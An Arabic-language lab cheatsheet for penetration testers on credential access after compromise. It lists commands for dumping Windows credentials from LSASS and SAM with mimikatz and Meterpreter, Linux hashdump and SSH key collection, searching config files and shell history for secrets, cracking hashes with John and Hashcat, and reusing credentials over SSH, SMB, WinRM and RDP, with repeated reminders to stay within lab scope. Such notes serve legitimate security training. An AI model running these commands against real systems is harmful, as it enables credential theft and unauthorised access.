1. Windows Credential Sources

قبل جمع أي Credential Material: أكد المستخدم الحالي والنظام والصلاحيات، لأن كثيرًا من مصادر الاعتماد تحتاج Privilege مرتفع.

Credential Access ليس أول خطوة بعد الـshell. اجمع فقط ما يخدم هدف اللاب، وبالصلاحيات المصرح بها.
Windows — تأكيد السياق WINDOWS CMD
whoami whoami /priv whoami /groups
Kiwi — SAM / secrets بعد elevated Meterpreter METERPRETER
pgrep lsass migrate [LSASS_PID] load kiwi lsa_dump_sam lsa_dump_secrets creds_all
يتطلب هذا المسار elevated privileges وmigration إلى lsass.exe.
Mimikatz executable — dump workflow موثق WINDOWS CMD
C:\\Temp\\mimikatz.exe privilege::debug lsadump::sam sekurlsa::logonpasswords
يجب أن ينجح privilege::debug، والأداة تحتاج صلاحيات مرتفعة.
Privilege '20' OK يظهر كمؤشر نجاح للـdebug privilege.
البحث عن Credential-related Post Modules MSFCONSOLE
search type:post platform:windows gather search credential search hashdump
راجع info/show options للـmodule الموجود في إصدارك بدل حفظ أسماء غير متأكد منها.
تأكيد هوية Windows بعد Reuse WINDOWS CMD
whoami hostname

2. Linux Credential Sources

اربط الـCredentials بالخدمات التي يمكن استخدامها عليها؛ لا تعِد استخدامها عشوائيًا على كل الشبكة.

Credential Found → Identify intended service/account → Confirm service exists → Test once بطريقة مناسبة → Stop on success.
Linux — تأكيد السياق VICTIM SHELL
whoami id
Linux hash dump عبر Metasploit post module MSFCONSOLE
use post/linux/gather/hashdump set SESSION [SESSION_ID] run
يُحفظ الناتج كـloot لاستخدامه لاحقًا في cracking.
تأكيد هوية Linux بعد Reuse VICTIM SHELL
whoami id

3. Application / Config / Environment Credentials

ابحث عن Credential Material واضح: SSH keys، config secrets، hashes أو حسابات ظهرت فعليًا — بدون اختراع بيانات.

مراجعة History للمستخدم الحالي VICTIM SHELL
history cat ~/.bash_history 2>/dev/null
وجود أمر فيه كلمة password لا يعني تلقائيًا أن القيمة Credential صالحة؛ تحقق قبل الاستخدام.
البحث المحدود عن Config/ENV في مسارات التطبيق VICTIM SHELL
find /home /opt /var/www -maxdepth 3 -type f \( -name "*.env" -o -name "*.conf" -o -name "*.ini" \) 2>/dev/null
لا تعمل جمعًا واسعًا لملفات المستخدمين بلا حاجة؛ التزم بهدف اللاب.
فحص Autologon configuration WINDOWS CMD
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
إذا ظهرت قيم حساسة فعليًا، وثّقها كFinding ولا تفترض وجودها مسبقًا.

4. SSH Keys & Credential Reuse

بعد العثور على Credential أو Key، اختبره على الخدمة المنطقية فقط. لا تحوّل Reuse إلى Password Spraying واسع.

جمع SSH credentials/keys عبر Metasploit MSFCONSOLE
use post/multi/gather/ssh_creds set SESSION [SESSION_ID] run
هذا المسار مخصص لـLinux credential dumping.
SSH Private Key Reuse KALI TERMINAL
chmod 0400 [PRIVATE_KEY] ssh -i [PRIVATE_KEY] [USERNAME]@[TARGET]
نجاح SSH login يؤكد أن المفتاح والحساب صالحان لذلك الهدف.

5. Hash Identification / John / Hashcat

هنا الاستفادة من Credential Material نفسه: cracking عند وجود Hash صالح للتحليل، ثم reuse فقط إذا كان الـworkflow يدعم ذلك.

قاعدة Hash Cracking: Hash found → Identify type → اختر John/Hashcat format الصحيح → Crack → Verify → Reuse منطقي. لا تخترع Hashcat mode من الذاكرة.
إذا حصلت على Password صالح، اختبره مرة واحدة على الحساب/الخدمة المرتبطة به ثم انتقل للهدف التالي.
فحص نوع Hash بشكل أولي KALI TERMINAL
hashid [HASH_FILE]
استخدم الناتج كقرينة، ثم تحقق من format من سياق الاستخراج/الأداة قبل cracking.
عرض Formats المتاحة في John KALI TERMINAL
john --list=formats
John باستخدام Format معروف KALI TERMINAL
john --format=[FORMAT] --wordlist=[WORDLIST] [HASH_FILE]
استخدم [FORMAT] فقط بعد تحديده فعليًا.
عرض النتائج التي فكها John KALI TERMINAL
john --show --format=[FORMAT] [HASH_FILE]
Hashcat عند معرفة Mode موثق KALI TERMINAL
hashcat -m [MODE] [HASH_FILE] [WORDLIST]
لا تخمّن [MODE]. استخدم mode الصحيح لنوع الـhash الذي لديك.
عرض Hashcat result KALI TERMINAL
hashcat -m [MODE] [HASH_FILE] --show

6. Validation / Reuse / Handoff

بعد Credential ناجح: وثّق مكان الاكتشاف والسياق والخدمة التي نجح عليها، ثم لا تكرر الجمع أو cracking بلا هدف.

Credential يعطي Host جديد؟ انتقل إلى Cheatsheet الخدمة المناسبة. شبكة داخلية جديدة؟ Pivoting. صلاحيات أعلى؟ Privilege Escalation/Post-Exploitation.
لا تنشر Credentials خارج بيئة اللاب ولا تحفظها في أماكن غير آمنة. لا تعمل Persistence أو Credential harvesting إضافي إلا إذا كان مطلوبًا صراحة.
Meterpreter — المستخدم والنظام METERPRETER
getuid sysinfo
فحص الخدمات على الهدف نفسه KALI TERMINAL
nmap -Pn -sV [TARGET]
حدد SSH/SMB/RDP/WinRM/Database services التي قد يكون لها معنى مع Credential مكتشف.
فحص TCP شامل عند الحاجة KALI TERMINAL
nmap -Pn -p- --min-rate 1000 [TARGET]
استخدم معدلًا مناسبًا فقط داخل Lab أو حسب قواعد الاختبار.
فحص خدمة محددة قبل Reuse KALI TERMINAL
nmap -Pn -sV -p[PORT] [TARGET]
مراجعة SSH directory للمستخدم الحالي VICTIM SHELL
ls -la ~/.ssh 2>/dev/null
دوّن فقط الملفات الموجودة فعليًا مثل private/public keys أو known_hosts.
SSH Password Reuse KALI TERMINAL
ssh [USERNAME]@[TARGET]
أدخل [PASSWORD] المكتشف عند الطلب؛ لا تستخدم قائمة كلمات مرور هنا.
SMB Credential Reuse KALI TERMINAL
smbclient -L //[TARGET] -U [USERNAME]
WinRM Credential Reuse KALI TERMINAL
evil-winrm -i [TARGET] -u [USERNAME] -p '[PASSWORD]'
RDP Credential Reuse KALI TERMINAL
xfreerdp /v:[TARGET] /u:[USERNAME] /p:'[PASSWORD]'
اختبر Credential معروف فقط. كثرة المحاولات قد تسبب Lockout أو ضوضاء واضحة.
توثيق Credential بشكل محلي وآمن KALI TERMINAL
printf '%s\n' '[SERVICE] [TARGET] [USERNAME] [CREDENTIAL_TYPE]' >> credential_notes.txt
لا تضع Password نفسه في ملف نصي إذا لم تكن تحتاجه؛ سجّل النوع والسياق بما يكفي للاب.
إدارة Session الناتجة من Credential صالح MSFCONSOLE
sessions sessions -i [SESSION_ID]
